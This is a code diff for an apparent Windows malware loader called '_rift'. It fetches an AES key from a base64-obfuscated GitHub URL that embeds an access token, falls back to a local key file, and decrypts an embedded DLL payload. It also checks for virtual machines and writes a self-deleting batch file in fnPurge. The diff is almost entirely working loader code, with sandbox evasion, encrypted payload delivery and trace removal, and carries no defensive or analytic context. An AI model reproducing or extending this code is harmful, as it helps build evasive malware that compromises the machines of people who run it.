@@ -27,35 +27,46 @@ INT WINAPI wWinMain(
 	fnInitializeXSR();
 
 	{	// Test base64
-		PVOID string = HAlloc(259, 0);
+		PVOID string = AllocMemory(259, 0);
 		for (int i = 0; i < 259; i++)
 			((PBYTE)string)[i] = (BYTE)(fnNext128p() >> 24);
 		CopyMemory(string, "https://raw.githubusercontent.com/Lima-X-Coding/Win32._rift/master/_rift/main.c?token=AISLTIFBLEXNHDBHX6Z2FOS63QJ3U", 116);
+		fnMd5HashingBegin();
 		PVOID hash = fnMD5HashData(string, 4);
 
 		SIZE_T bout;
 		PVOID base = fnB64Encode(string, 116, &bout);
-		HFree(string);
+		FreeMemory(string);
 		PVOID base2 = fnB64Decode(base, bout, &bout);
-		HFree(base);
+		FreeMemory(base);
 
 		PVOID hash2 = fnMD5HashData(base2, 4);
-		HFree(base2);
+		FreeMemory(base2);
 		BOOL test = fnMD5Compare(hash, hash2);
 
-		HFree(hash);
-		HFree(hash2);
+		FreeMemory(hash);
+		FreeMemory(hash2);
 	}
 
 	PVOID pKey = fnDownloadKey();
+	if (!pKey) {
+		PWSTR szKeyBlob = (PWSTR)AllocMemory(MAX_PATH, 0);
+		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->szCD, L"..\\RIFTKEY");
+		DWORD nKeyBlob;
+		pKey = fnAllocReadFileW(szKeyBlob, &nKeyBlob);
+	}
+	fnAesCryptBegin();
+	fnAesLoadKey(pKey);
+
 	// init con
 	fnOpenConsole();
 
 	BOOL bVM = fnCheckVMPresent();
 
-//	fnSetWrapFileName(L"RIFTKEY");
 	SIZE_T nDll;
-	PVOID pDll = fnUnpackResource(L"_rift.KEY", IDR_RIFTDLL, &nDll);
+	PVOID pDll = fnUnpackResource(IDR_RIFTDLL, &nDll);
+	fnAesCryptEnd();
+	fnMd5HashingEnd();
 	if (!pDll)
 		return 0x1;
 
@@ -80,7 +91,7 @@ INT WINAPI wWinMain(
 	FreeLibrary(dhDll);
 #endif
 	SecureZeroMemory(pDll, nDll);
-	HFree(pDll);
+	FreeMemory(pDll);
 
 	{	// CleanUp
 		HANDLE hPH = GetProcessHeap();
@@ -93,23 +104,24 @@ INT WINAPI wWinMain(
 PVOID fnDownloadKey() {
 	PCWSTR szAgent = fnAllocRandomB64W(8, 16);
 	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
-	HFree(szAgent);
-	INT a = GetLastError();
+	if (!hNet)
+		return 0;
+	FreeMemory(szAgent);
 
 	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
 	SIZE_T nURL;
 	PCSTR szURL = fnB64Decode(szB64URL, 156, &nURL);
-	HINTERNET hURL = InternetOpenUrlA(hNet, szURL, 0, 0, 0, 0);
+	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, 0, 0, 0, 0);
+	if (!hUrl)
+		return 0;
+	FreeMemory(szURL);
 
-	a = GetLastError();
-	HFree(szURL);
-
-	PVOID pBuffer = HAlloc(AES_BLOB_SIZE, 0);
+	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE, 0);
 
 	SIZE_T nRead;
-	InternetReadFile(hURL, pBuffer, AES_BLOB_SIZE, &nRead);
+	InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);
 
-	InternetCloseHandle(hURL);
+	InternetCloseHandle(hUrl);
 	InternetCloseHandle(hNet);
 
 	return pBuffer;
@@ -133,7 +145,7 @@ static CONST WCHAR t_szSelfDelBat[] = {
 };
 VOID fnPurge() {
 	// Prepare String for Filename of Batchfile
-	PWSTR szFilePath = (PWSTR)HAlloc(MAX_PATH * sizeof(WCHAR), 0);
+	PWSTR szFilePath = (PWSTR)AllocMemory(MAX_PATH * sizeof(WCHAR), 0);
 	SIZE_T nRandom;
 	PCWSTR szRandom = fnAllocRandomPathW(8, 16, &nRandom);
 	CopyMemory(szFilePath, g_PIB->szCD, MAX_PATH * sizeof(WCHAR));
@@ -141,7 +153,7 @@ VOID fnPurge() {
 	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");
 
 	// Prepare Script content
-	PVOID pScriptW = HAlloc(0x800, 0);
+	PVOID pScriptW = AllocMemory(0x800, 0);
 	UINT uiRandomID = fnNext128ss();
 	PCWSTR szMFN = fnGetFileNameFromPathW(g_PIB->szMFN);
 	StringCchPrintfW(pScriptW, 0x400, t_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, fnGetFileNameFromPathW(szFilePath));
@@ -151,9 +163,9 @@ VOID fnPurge() {
 	StringCchLengthW(pScriptW, 0x400, &nScript);
 	PSTR pScriptA = (PSTR)HeapAlloc(g_PIB->hPH, 0, 0x400);
 	WideCharToMultiByte(CP_ACP, 0, pScriptW, -1, pScriptA, 0x400, 0, 0);
-	HFree(pScriptW);
+	FreeMemory(pScriptW);
 
 	// Write to Disk
 	fnWriteFileCW(szFilePath, pScriptA, nScript);
-	HFree(pScriptA);
+	FreeMemory(pScriptA);
 }
